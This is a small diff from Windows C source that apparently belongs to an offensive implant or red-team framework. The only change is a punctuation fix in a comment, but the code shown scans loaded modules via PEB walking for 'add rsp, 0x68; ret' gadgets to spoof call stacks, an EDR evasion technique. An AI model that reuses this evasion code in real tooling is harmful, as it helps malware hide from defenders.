@@ -44,7 +44,7 @@ BOOL InitCallstackSpoof()
     // Operator-selected module list (CONFIG_CALLSTACK_SPOOF_MODULES). Default
     // ntdll/kernel32/kernelbase have hundreds of `add rsp, 0x68; ret` epilogues;
     // custom modules are scanned in the order the operator listed them. First
-    // match wins. PEB-walk only — module must already be mapped in the host.
+    // match wins. PEB-walk only - module must already be mapped in the host.
     static const ULONG mods[] = { CONFIG_CALLSTACK_SPOOF_MODULES };
     const SIZE_T mod_count = CONFIG_CALLSTACK_SPOOF_MODULE_COUNT;
     for (SIZE_T i = 0; i < mod_count && !g_spoof_gadget; i++)
